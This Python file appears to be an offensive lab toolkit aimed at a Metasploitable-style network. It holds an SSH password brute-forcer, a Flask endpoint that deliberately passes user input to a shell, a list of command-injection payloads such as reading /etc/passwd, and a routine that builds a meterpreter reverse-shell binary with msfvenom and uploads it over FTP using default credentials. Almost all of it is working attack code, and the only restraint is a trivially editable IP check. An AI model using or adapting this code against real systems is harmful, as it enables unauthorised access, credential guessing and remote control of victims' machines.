import paramiko
import time
import os
import requests
import subprocess
from bs4 import BeautifulSoup
from flask import Flask, request
import threading

# === Safety Check Function ===
def is_safe_ip(ip):
    return ip.startswith("10.0.2.") or ip == "127.0.0.1"

# === Brute Force SSH ===
def brute_force_ssh(target_ip, port, usernames, passwords, delay=1):
    if not is_safe_ip(target_ip):
        print("[-] Unsafe IP detected. Execution aborted.")
        return

    print(f"[+] Starting SSH brute force on {target_ip}:{port}")
    for username in usernames:
        for password in passwords:
            try:
                print(f"[*] Trying {username}:{password}")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target_ip, port=port, username=username, password=password, timeout=3)
                print(f"[+] SUCCESS! Logged in with {username}:{password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {username}:{password}")
                time.sleep(delay)
            except Exception as e:
                print(f"[!] Error: {e}")
    print("[+] Brute force complete.")

# === Command Injection ===
def real_command_injection():
    app = Flask(__name__)

    @app.route('/inject', methods=["POST"])
    def inject():
        user_input = request.form.get("ip")
        try:
            result = subprocess.check_output(user_input, shell=True, stderr=subprocess.STDOUT)
            return f"<pre>{result.decode().strip()}</pre>"
        except subprocess.CalledProcessError as e:
            return f"<pre>{e.output.decode().strip()}</pre>"

    def run_flask():
        app.run(host="127.0.0.1", port=5000)

    server_thread = threading.Thread(target=run_flask)
    server_thread.daemon = True
    server_thread.start()
    time.sleep(2)

    print("[+] Vulnerable service started at http://127.0.0.1:5000/inject")

    payloads = [
        "127.0.0.1; whoami",
        "127.0.0.1; id",
        "127.0.0.1; uname -a",
        "127.0.0.1; ls /home",
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1; netstat -ntlp",
        "127.0.0.1; ps aux",
        "127.0.0.1; df -h",
        "127.0.0.1; ifconfig || ip a"
    ]

    while True:
        print("\nType your command injection payload (or type 'menu' to see examples, or 'exit' to quit):")
        user_input = input("CMD> ").strip()

        if user_input.lower() == "exit":
            print("[*] Injection session ended.")
            break
        elif user_input.lower() == "menu":
            print("\n=== Payload Menu ===")
            for i, p in enumerate(payloads, 1):
                print(f"{i}. {p}")
            continue
        elif not user_input:
            print("[-] Empty input, try again.")
            continue

        try:
            url = "http://127.0.0.1:5000/inject"
            data = {"ip": user_input}
            headers = {"User-Agent": "Penetrax-Agent"}
            response = requests.post(url, headers=headers, data=data)

            soup = BeautifulSoup(response.text, 'html.parser')
            pre = soup.find("pre")

            print("\n" + "="*30)
            print("        Command Output")
            print("="*30)

            if pre:
                print(pre.text.strip())
            else:
                print("[!] No output returned.")
        except Exception as e:
            print(f"[!] Error occurred: {e}")

        print("\n[*] Injection complete.")

# === Reverse Shell ===
def msf_reverse_shell(attacker_ip="10.0.2.15", target_ip="10.0.2.5", port=5555):
    if not is_safe_ip(target_ip):
        print("[-] Unsafe target IP detected. Reverse shell aborted.")
        return

    print("\n[+] Generating reverse shell payload...")
    payload = "reverse-sh.elf"
    generate_cmd = (
        f"msfvenom -p linux/x86/meterpreter/reverse_tcp "
        f"LHOST={attacker_ip} LPORT={port} -f elf -o {payload}"
    )
    os.system(generate_cmd)

    print("\n[+] Uploading payload via FTP to target...")
    ftp_script = f"""open {target_ip}
user msfadmin msfadmin
put {payload}
bye
"""
    with open("ftp_script.txt", "w") as f:
        f.write(ftp_script)

    os.system("ftp -n < ftp_script.txt")
    os.remove("ftp_script.txt")

    print("\n[+] Payload uploaded!")
    print("\n Start Metasploit listener manually on Kali:")
    print("    msfconsole")
    print("    use exploit/multi/handler")
    print("    set payload linux/x86/meterpreter/reverse_tcp")
    print(f"    set LHOST {attacker_ip}")
    print(f"    set LPORT {port}")
    print("    run")

    print("\n On the Metasploitable machine, run the payload:")
    print("    chmod +x reverse-sh.elf && ./reverse-sh.elf")
    print("\n Reverse shell setup complete.\n")
